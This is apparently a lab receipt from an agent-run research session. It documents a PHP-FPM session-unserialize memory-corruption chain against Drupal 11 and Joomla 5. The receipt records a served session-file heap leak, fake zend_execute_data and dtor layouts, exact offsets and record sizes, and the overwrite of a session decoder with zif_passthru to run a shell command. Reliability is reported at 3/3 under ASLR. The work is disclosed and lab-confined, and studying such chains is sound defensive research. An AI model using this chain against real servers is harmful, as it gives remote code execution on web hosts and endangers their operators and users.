# Drupal 11 + nginx + PHP-FPM: F14 static session leak and `zif_passthru` survivor

Receipt directory: `/tmp/opencode/research/drupal_fpm_20261022T013000Z`
Date: 2026-10-22 (local CEST)

> **Addendum:** Section 8 records a **3/3 fresh-ASLR repeat** and the **Joomla 5.4.10**
> file-session result. The baseline numbers in Sections 1-7 (master 144755, worker
> 162869) are historical and are not the current master/worker.
Verdict: **Marker created and FPM worker survived.** The served F14-style session-file
leak supplied the heap address (`K_dest`) used to derive the fake `execute_data` and
fake dtor geometry. A gdb-free final run created
`/tmp/opencode/research/drupal_fpm_20261022T013000Z/MARKER_PASSTHRU` through
`zif_passthru`; worker **162869** served the poisoned trigger and a follow-up health
request and was still alive.

## 1. Private stack

| Component | Value |
|---|---|
| FPM binary | `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm`, md5 `4ee099823b75e16ea36f93c71d57bfd8` |
| FPM master | **144755**, command `php-fpm: master process (/tmp/opencode/research/drupal_fpm_20261022T013000Z/conf/fpm.conf)`, started `Thu Oct 22 01:35:30 2026` |
| FPM pool / socket | `lab` / `run/php-fpm-lab.sock`; one worker, `pm=static`, `pm.max_children=1` |
| nginx | private `127.0.0.1:28870`, config `conf/nginx.conf` |
| MariaDB | `127.0.0.1:33318`, PID 143977, datadir `db/`, socket `run/mysql.sock` |
| Drupal | 11.4.11 (`www/core/lib/Drupal.php:79`) at `/tmp/opencode/drupaldx` -> `www`; home HTTP 200 (12,320 bytes, SHA-1 `6434d13b08e085e7d1aa3c771a2f311eaa8f68f8`) |
| Session dir | `/tmp/opencode/drupaldx/sites/default/files/php/sessions`, also served by nginx at `/sites/default/files/php/sessions/` |

ASLR was on: `/proc/sys/kernel/randomize_va_space` = `2`. The FPM master was started
normally; there was no `setarch -R`, no `LD_PRELOAD`, and no gdb in the final run.
Workers forked from this master inherit the same randomized heap base
(`0x7f5e6aa00040`) because the master is long-lived; this is a fork-inherited address,
not disabled ASLR. Absolute addresses were obtained from the served static leak and
the gdb calibration, not brute force.

Shared PIDs `4052217`, `4052937`, `4053032`, `4054145` and unrelated FPM workers
`52927`, `153028`, `154618` were not touched. Only private lab worker PIDs under
master 144755 were used/killed/respawned during calibration.

## 2. Drupal default and lab misconfiguration (disclosure)

Drupal 11.4.11's default session handler is the **database**. A real login created:

- `sid=FNSznSMsphK_Gf1rr3scy31rGgAqxobDDoIGnnG7d4g`, `uid=1`, session length 175
- row in MariaDB `drupal.sessions` (query below), and **no** `sess_<sid>` file in the
  session directory.

Query (private MariaDB client, TCP):

```
/tmp/opencode/realapps/mariadb-11.4.5-linux-systemd-x86_64/bin/mariadb \
  -h127.0.0.1 -P33318 -udrupal -p[redacted] drupal \
  -e "SELECT sid,uid,LENGTH(session),LEFT(session,60) FROM sessions; \
      SELECT COUNT(*) FROM sessions; SHOW TABLES LIKE 'sessions';"
```

Result: one row `FNSznSMsphK_Gf1rr3scy31rGgAqxobDDoIGnnG7d4g / 1 / 175`,
`sessions` table exists, and `ls .../sess_FNSzn...` -> `No such file or directory`.

Therefore the file-session behavior used by this lab is a **lab misconfiguration**,
not Drupal default. It is implemented by
`www/exploit/.user.ini` (per-request native PHP file sessions) and a session directory
that nginx serves. The `.user.ini` contents:

```
session.save_handler = files
session.save_path = /tmp/opencode/drupaldx/sites/default/files/php/sessions
session.serialize_handler = php
session.use_strict_mode = 0
session.use_only_cookies = 1
session.upload_progress.enabled = 1
session.upload_progress.cleanup = 0
session.upload_progress.prefix = ""
session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.gc_probability = 0
memory_limit = 2M
unserialize_max_depth = 20000
```

The lab-only Drupal source patches are also disclosed:

- `www/core/modules/system/src/Install/Requirements/SystemRequirements.php`:
  the `gd` extension requirement was removed (no `gd` reference remains). Without
  this the installer refused the host's PHP extension set.
- `www/core/lib/Drupal/Core/Command/InstallCommand.php`: changed from the stock
  SQLite install to MySQL/MariaDB. Lines 73-74 require `pdo_mysql`; lines 175-190
  set database `drupal`, user `drupal`, password `[redacted]`, host `127.0.0.1`,
  port `33318`. The resulting `www/sites/default/settings.php:906-917` contains the
  same DB configuration.

These patches affect only the private lab install.

## 3. F14 static session-file leak (adapted to FPM)

The exact F14 upload-progress **plant** (OOM inside `php_request_startup`) is fatal on
FPM: the outer `zend_first_try` in `sapi/fpm/fpm/fpm_main.c` catches the bailout and
returns `FPM_EXIT_SOFTWARE`; the worker exits with code 70. This was observed and is a
hard blocker for the exact F14 request ordering on FPM. The lab instead used:

1. **Plant:** script-level `session_start()` OOM in `www/exploit/sess.php` with the
   64,946-byte nested-array record `sess_pl1`. The OOM is caught inside
   `php_execute_script`, so the worker survives.
   Measured with `gb_measure.gdb`:
   - `heap=0x7f5e6aa00040`
   - `BG(unserialize).data = P = 0x7f5e6aa82000`, level 1
   - `last_dtor = B0 = 0x7f5e6aa90000`
2. **Trigger:** upload-progress request with cookie `tb1` and the 81,920-byte
   `S|J|K` record `sess_tb1`, whose first decode occurs before `PHP_RINIT(basic)`
   and therefore uses the plant's stale `BG(unserialize).data=P`.
   - Trigger data start: `X = 0x7f5e6aa70000` (class `0x14000`)
   - Fake `php_unserialize_data` at `P`; fake dtor `D=P+0x80`
   - `used_slots = -0x1405` -> first `var_tmp_var` slot
     `S_dest = 0x7f5e6aa6e040`
   - The S zend_string length is overwritten from 32 to **4096**.
   - `PS_WRITE val=0x7f5e6aa99000 len=86282 head=537c733a343039363a22...`
     (`S|s:4096:"`).
   - The worker dies on the *second* decode after the write, as expected for the
     F14 primitive; the file is already on disk and is served after respawn.

**Served leak.** `GET /sites/default/files/php/sessions/sess_tb1` returned
HTTP 200, 86,282 bytes, SHA-1
`5f559ec2cdb10aaab0cd5b73d85f12c5e3517021`. nginx access log:
`[...:01:50:11 +0200] "GET /sites/default/files/php/sessions/sess_tb1 HTTP/1.1" 200 86282`.
Saved copy: `arms/leak_81920_used_-0x1405.served.bin`.

Parsed leak:

- `S` field length 4,096; data starts at file offset 10.
- At `S` data offset **8**: `K_dest = 0x7f5e6aa85000`.
- 183 heap-pointer candidates in the 4,096-byte `S` window.
- Measured plant `last_dtor B0 = 0x7f5e6aa90000`.
  In this (master/fork) layout, `B0 = K_dest + 0xB000`; `B0` itself is not one of the
  4,096-byte S-window pointers, so the served leak gives `K_dest`, and the
  `K_dest -> P/B0` deltas come from the gdb calibration.

Geometry summary for this master:

```
heap   = 0x7f5e6aa00040
P      = 0x7f5e6aa82000   (stale php_unserialize_data)
B0     = 0x7f5e6aa90000   (measured plant last_dtor)
X      = 0x7f5e6aa70000   (F14 trigger data start, class 0x14000)
S_dest = 0x7f5e6aa6e040   (S zend_string)
K_dest = 0x7f5e6aa85000   (S[8], served leak)
S      = 0x7f5e6aa85018   (second decode val / flush buffer)
```

## 4. From the leak to `zif_passthru`

The saved leak gives `K_dest=0x7f5e6aa85000`. The final record was built from the
leak-derived addresses:

```
P = K_dest - 0x3000  = 0x7f5e6aa82000
X = K_dest - 0x15000 = 0x7f5e6aa70000
S = K_dest + 0x18    = 0x7f5e6aa85018
```

These values were validated by the gdb calibration and are recorded in
`arms/leak_derived.txt`.

Final trigger record: exactly 81,920 bytes, one session key of length 81,908,
value `i:10731636;` (`zif_passthru = 0xa3c074`):

- The key's first 0x300 bytes are the fake `zend_execute_data` at `S`.
- Fake struct `php_unserialize_data` at `P` (inside the key bytes).
- Fake dtor at `D=P+0x88=0x7f5e6aa82088`, `used_slots=-8752716037309`, so the
  `var_tmp_var` slot is exactly
  `ps_serializers[1].decode = 0x22c54c8`.
- Fake execute_data fields:
  `S+0x18=F`, `S+0x2c=1`, `S+0x50=F`, `S+0x58=6` (`IS_STRING`);
  `F=S+0x200=0x7f5e6aa85218`; `F+0x10=73`; command at `F+0x18`:
  `touch /tmp/opencode/research/drupal_fpm_20261022T013000Z/MARKER_PASSTHRU;`
- The key contains no `|` delimiter; the only `|` is the key/value separator at
  offset 81,908.

The upload-progress trigger (`www/exploit/trigger.php`, no script-level
`session_start`) decodes the seeded record at request startup, before `PHP_RINIT(basic)`.
The first decode writes `zif_passthru` into `ps_serializers[1].decode`. The
upload-progress flush then re-encodes the session; the encoded record begins with the
81,908-byte key, i.e. with the fake `execute_data` at the second-decode data pointer
`S`. The second decode calls the poisoned decoder with `rdi=S`; `zif_passthru` runs
the command via `php_exec_ex(mode=3) -> php_exec -> popen`.

## 5. Final gdb-free run

Final evidence file: `arms/zif_run_1792626928.json`.

| Field | Result |
|---|---|
| Worker at start | **162869** (fresh fork under master 144755) |
| Plant | `POST /exploit/sess.php` HTTP **200**; `memory_limit=2M` OOM; worker **162869** alive |
| Trigger | `POST /exploit/trigger.php` HTTP **200**, body `trigger-ok\n` |
| Marker | `MARKER_PASSTHRU` exists, size 0, mtime `2026-10-22 01:55:29.025888467 +0200` |
| Worker after trigger | **162869** (same PID) |
| Health | `POST /exploit/health.php` HTTP **200**, body `health-ok\n` |
| Worker after health | **162869** (same PID) |
| gdb | none attached; final run gdb-free |
| ASLR | `randomize_va_space=2`; master 144755 normal start |
| FPM exit log | no exit entry for 162869 after it started at 01:55:27 |

The final run's trigger record seed SHA-1 was
`c2fbd4e14fae30152b17c1a32a70b42db671bfad` (81,920 bytes). After the trigger the
session file contains the 327-byte upload-progress array
`x|a:5:{s:10:"start_time"...}`, because the command already ran and the poisoned
worker's session state is post-exploit. The marker is the decisive proof.

The worker's `ps_serializers[1].decode` is persistently changed to `zif_passthru`
after this request. A later session-using request on 162869 would call it again; the
health endpoint deliberately does not use sessions.

## 6. Deviations / blockers

1. **Drupal default is DB sessions.** File sessions are a lab `.user.ini`
   misconfiguration (disclosed above); the file-session directory is served by
   nginx. Drupal itself did not choose this path.
2. **Exact F14 upload-progress plant is fatal on FPM.** Startup OOM -> outer
   `zend_first_try` -> `FPM_EXIT_SOFTWARE` (exit 70). The working plant is
   script-level OOM, followed by an upload-progress trigger whose decode happens
   before `PHP_RINIT(basic)` and sees the stale `BG(unserialize)`.
3. **F14 save_path UAF/latch is not used.** The session directory is already the
   configured `save_path` and is served by nginx, so the separate latch/UAF is not
   needed. The original latch also relies on startup OOM and would kill the FPM
   worker.
4. **Trigger geometry differs from F14.** The F14 `0x2000` shift was not reproduced;
   in this lab the 0x14000 trigger buffer is at `X=P-0x12000`, and the fake struct is
   at record/key offset `0x11FE8`, not `0xE000`. The essential leak primitive
   (stale P -> `S_dest` write -> S length 4096 -> served `K_dest`) was reproduced.
5. **`B0` is measured, not directly present in the S window.** The leak gives
   `K_dest`; `B0=K_dest+0xB000` is the measured fork-layout delta. The final zif
   chain does not use `B0`; it uses the leak-derived `P` and the fake dtor at
   `P+0x88`.
6. The FPM master 144755 must not be restarted if the same absolute heap addresses
   are to be reused; workers fork with the same base. This was not restarted.

## 7. Evidence paths

- `arms/leak_81920_used_-0x1405.served.bin` (86,282 bytes, SHA-1 `5f559ec2...`)
- `arms/safe_leak_157772_81920_-5125.json` (leak run: `PS_WRITE len=86282`,
  first decode 81,920 @ `0x7f5e6aa70000`, second 86,282 @ `0x7f5e6aa85000`)
- `arms/zif_cal_161340.json` (safe fake-dtor calibration: second decode str
  `0x7f5e6aa85000` -> `S=0x7f5e6aa85018`; worker survives)
- `arms/zif_run_1792626928.json` (final gdb-free marker + survivor)
- `arms/leak_derived.txt` (K_dest/P/X/S derivation)
- `MARKER_PASSTHRU`
- `conf/fpm.conf`, `conf/nginx.conf`, `www/exploit/.user.ini`,
  `www/exploit/sess.php`, `www/exploit/trigger.php`, `www/exploit/health.php`
- `log/fpm-error.log` (no exit for 162869 after start), `log/nginx-access.log`
  (HTTP 200 for leak, trigger, health)
- `gdb/gb_measure.gdb`, `gdb/gb_cal.gdb` (calibration only)

## 8. Addendum: fresh-ASLR repeat and Joomla 5.4.10

### 8.1 Drupal repeat: 3/3 with new masters

The baseline chain was repeated three times. "Fresh ASLR" was a full restart of the
private FPM master, not merely a worker respawn: a respawned worker inherits the
long-lived master's randomized heap base, whereas a new master gets a new base. The
three masters were **167756**, **171921**, and **172056**; the heap bases
`0x7ffad6200040`, `0x7f4afa000040`, and `0x7f086b400040` are all distinct.
`randomize_va_space` remained `2`. All final stages were gdb-free; gdb was used only
for the plant/leak calibration and was detached before the final trigger.

| Run | Master | Heap | P | B0 | K_dest | X | S_dest | Leak bytes / SHA-1 | Final worker | Marker |
|---|---:|---|---|---|---|---|---|---|---|---|
| r0 | 167756 | `0x7ffad6200040` | `0x7ffad6282000` | `0x7ffad6290000` | `0x7ffad6285000` | `0x7ffad6270000` | `0x7ffad626e040` | 86,282 / `453c04acc28ddf6086e17b5afeff0d58b30ce678` | 171102 | `MARKER_PASSTHRU_r0` |
| r1 | 171921 | `0x7f4afa000040` | `0x7f4afa082000` | `0x7f4afa090000` | `0x7f4afa085000` | `0x7f4afa070000` | `0x7f4afa06e040` | 86,282 / `48968aaf45dbf4bbe87c18725a037916c955d140` | 171977 | `MARKER_PASSTHRU_r1` |
| r2 | 172056 | `0x7f086b400040` | `0x7f086b482000` | `0x7f086b490000` | `0x7f086b485000` | `0x7f086b470000` | `0x7f086b46e040` | 86,282 / `66238634e197fa13cd9f9429e7e4695df3caca34` | 172088 | `MARKER_PASSTHRU_r2` |

All three used the same relative geometry; there was **no shifted delta**:

| Run | `B0-K` | `P-K` | `X-K` | `S_dest-K` | `S-K` | Final result |
|---|---:|---:|---:|---:|---:|---|
| r0 | `+0xB000` | `-0x3000` | `-0x15000` | `-0x16FC0` | `+0x18` | marker, same worker, health 200 |
| r1 | `+0xB000` | `-0x3000` | `-0x15000` | `-0x16FC0` | `+0x18` | marker, same worker, health 200 |
| r2 | `+0xB000` | `-0x3000` | `-0x15000` | `-0x16FC0` | `+0x18` | marker, same worker, health 200 |

For every run the final worker was identical before the trigger, after the trigger, and
after the health request; the marker exists (size 0), `trigger-ok\n` and `health-ok\n`
were returned with HTTP 200, and the FPM log has no exit for that worker. The worker
that handled the leak trigger died as expected; the next fresh worker handled the final
stage. Reliability was **3/3 successes** with no ASLR-dependent address shift.

Evidence: `arms/repeat_r0.json`, `arms/repeat_r1.json`, `arms/repeat_r2.json`,
`arms/repeat_summary.json`, and `arms/repeat_r*.leak.served.bin`. The current Drupal
private master is **172056** with final worker **172088**.

### 8.2 Joomla 5.4.10: negative default, positive lab file-session test

Joomla 5.4.10 was installed at `/tmp/opencode/joomla5` with database `joomla`, prefix
`jos_`, private FPM master **174553**, and nginx `127.0.0.1:28871`. Its **installed
default** is `session_handler='database'`: a front-page request wrote a 716-byte session
to `jos_session` and created no `sess_*` file in `tmp/`. The package ships only
`tmp/index.html`, not `tmp/.htaccess`. Thus the premise "Joomla 5 file sessions live in
the web-served `tmp/` by default" is **false for 5.4.10**; there is no default session
file for nginx to serve.

For the requested file-session test, the default was preserved as
`configuration.php.default_database` and `configuration.php` was changed to
`session_handler='filesystem'` with
`session_filesystem_path='/tmp/opencode/joomla5/tmp'`. Joomla then wrote
`tmp/sess_a789...` (716 bytes), and nginx served it at
`/tmp/sess_a789...` with HTTP 200, SHA-1
`7195681a86bfec51ca7145c8653897cca74fea2b`. A lab-created `tmp/.htaccess`
(`Require all denied`, `Deny from all`) was also served HTTP 200, proving nginx ignores
it; the file is not shipped by Joomla.

The F14 leak + `zif_passthru` was then reproduced on this lab file-session path:

```
heap   = 0x7f06c6200040
P      = 0x7f06c6281000
B0     = 0x7f06c6290000
K_dest = 0x7f06c6284000
X      = 0x7f06c626b000
S_dest = 0x7f06c6269040
P = K - 0x3000; B0 = K + 0xC000; X = K - 0x19000; S_dest = K - 0x1AFC0; S = K + 0x18
```

The Joomla `B0-K` delta is **`0xC000`**, so the Drupal `0xB000` calibration cannot be
reused. Joomla also required a **98,304-byte (`0x18000`) record** with
`used=-0x1805`, because `P-X=0x16000` does not fit the Drupal 81,920-byte record; a
benign 0x18000 trigger measured the same `X`. The served leak was 102,666 bytes
(SHA-1 `d41c2665672a322950548b94df950573d172ad80`), and the final gdb-free trigger on
worker **178847** created `MARKER_PASSTHRU_j2`; the same worker served the trigger and
health requests (HTTP 200) and survived.

Full Joomla details and evidence: `JOOMLA_RECEIPT.md` in
`/tmp/opencode/research/joomla_fpm_20261022T021000Z/`.

### 8.3 Caveats after the repeat

1. **Drupal default remains DB sessions.** The file-session path is the lab `.user.ini`
   misconfiguration from Section 2; it is not Drupal's default.
2. **The plant is script-level OOM**, followed by the upload-progress trigger; the exact
   F14 startup OOM still exits FPM with `FPM_EXIT_SOFTWARE` (exit 70). The save_path
   latch/UAF was not needed.
3. **`B0` is gdb-calibrated**, not directly in the 4,096-byte S window; the final chain
   uses the served `K_dest` plus the measured/derived geometry. The final stage itself
   was gdb-free.
4. **Joomla's file-session result is a lab configuration change**, not its default.
   Joomla 5.4.10's default is database sessions; `tmp/.htaccess` is not shipped. The
   `.htaccess` test is a lab-created deny file.
5. **Joomla uses a different geometry and record size**: `B0-K=0xC000`, `X-K=-0x19000`,
   `S_dest-K=-0x1AFC0`, total `0x18000`, `used=-0x1805`. Do not reuse the Drupal
   `0xB000`/`81920`/`-0x1405` constants.
6. **No shared PIDs were touched.** All masters, pools, nginx listeners, and markers are
   private to this lab.

### 8.4 New evidence paths

- `arms/repeat_r0.json`, `arms/repeat_r1.json`, `arms/repeat_r2.json`
- `arms/repeat_summary.json`
- `arms/final_verification.txt` (3/3 Drupal + Joomla assertions)
- `arms/repeat_r0.leak.served.bin`, `arms/repeat_r1.leak.served.bin`,
  `arms/repeat_r2.leak.served.bin`
- `logs/repeat_r0.out`, `logs/repeat_r1.out`, `logs/repeat_r2.out`
- `/tmp/opencode/research/joomla_fpm_20261022T021000Z/JOOMLA_RECEIPT.md`
- `/tmp/opencode/research/joomla_fpm_20261022T021000Z/arms/repeat_j2.json`
- `/tmp/opencode/research/joomla_fpm_20261022T021000Z/arms/joomla_session_evidence.txt`
- `/tmp/opencode/research/joomla_fpm_20261022T021000Z/arms/joomla_config_evidence.txt`
